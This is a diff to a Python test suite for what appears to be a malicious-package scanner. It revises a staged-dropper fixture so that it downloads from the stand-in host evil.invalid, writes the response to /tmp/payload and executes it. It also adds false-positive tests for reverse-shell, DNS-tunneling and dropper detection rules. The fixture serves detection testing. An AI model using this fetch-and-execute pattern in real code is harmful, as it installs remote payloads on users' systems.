@@ -168,9 +168,10 @@ def test_distillguard_staged_dropper_crypto_vm_persistence_and_mining():
     dropper = rules({
         'index.js': (
             'const https = require("https"); const fs = require("fs"); const cp = require("child_process");\n'
-            'https.get("https://evil.invalid/bin", () => {});\n'
-            'fs.writeFileSync("/tmp/payload", "bin");\n'
-            'cp.exec("/tmp/payload");'
+            'https.get("https://evil.invalid/bin", (res) => {\n'
+            '  res.pipe(fs.createWriteStream("/tmp/payload"));\n'
+            '  cp.exec("/tmp/payload");\n'
+            '});'
         )
     })
     assert 'STAGED_PAYLOAD_DROPPER' in dropper
@@ -249,3 +250,54 @@ def test_research_lifecycle_chains_credentials_imds_worm_tls_python_and_native()
     assert {'INSTALL_LOADER', 'PYTHON_STARTUP_HOOK', 'PYTHON_BUILD_HOOK', 'NATIVE_BINARY', 'AGENT_PROMPT_INJECTION'} <= cross.keys()
     assert cross['PYTHON_STARTUP_HOOK'].severity == 'critical'
 
+
+
+def test_p0_false_positive_and_correlation_remediations():
+    # P0.1 Staged dropper FP boundary: fetch() + unrelated fs.writeFileSync + exec("npm run build")
+    benign_dropper = rules({
+        'index.js': (
+            'const https = require("https"); const fs = require("fs"); const cp = require("child_process");\n'
+            'https.get("https://registry.npmjs.org/health", () => {});\n'
+            'fs.writeFileSync("config.json", JSON.stringify({ ok: true }));\n'
+            'cp.exec("npm run build");'
+        )
+    })
+    assert 'STAGED_PAYLOAD_DROPPER' not in benign_dropper
+
+    # P0.2 Reverse shell FP boundary: net.connect() + cp.spawn('/bin/sh') without stream pipe linkage or reverse shell flags
+    benign_revshell = rules({
+        'index.js': (
+            'const net = require("net"); const cp = require("child_process");\n'
+            'const client = net.connect(8080, "127.0.0.1");\n'
+            'const sh = cp.spawn("/bin/sh", ["-c", "echo hello"]);'
+        )
+    })
+    assert 'REVERSE_SHELL' not in benign_revshell
+
+    # P0.3 DNS tunneling FP boundary: reading domain names from a configuration file must not trigger DNS_TUNNELING
+    benign_dns = rules({
+        'index.js': (
+            'const dns = require("dns"); const fs = require("fs");\n'
+            'const domain = fs.readFileSync("domains.txt", "utf8");\n'
+            'dns.resolve4(domain, () => {});'
+        )
+    })
+    assert 'DNS_TUNNELING' not in benign_dns
+
+    # P0.4 Severity & confidence calibration in assess()
+    from backend.guardian.models import Finding
+    # Low confidence critical finding must be capped at 'Review recommended' rather than 'Critical concern'
+    low_crit = Finding(
+        id='lc1', rule='REVERSE_SHELL', title='Speculative shell', category='Execution',
+        severity='critical', confidence='low', observed='x', explanation='x', implication='x', recommendation='x', evidence=[]
+    )
+    risk_low, _ = assess([low_crit])
+    assert risk_low == 'Review recommended'
+
+    # High confidence critical finding correctly produces 'Critical concern'
+    high_crit = Finding(
+        id='hc1', rule='REVERSE_SHELL', title='Verified shell pipe', category='Execution',
+        severity='critical', confidence='high', observed='x', explanation='x', implication='x', recommendation='x', evidence=[]
+    )
+    risk_high, _ = assess([high_crit])
+    assert risk_high == 'Critical concern'
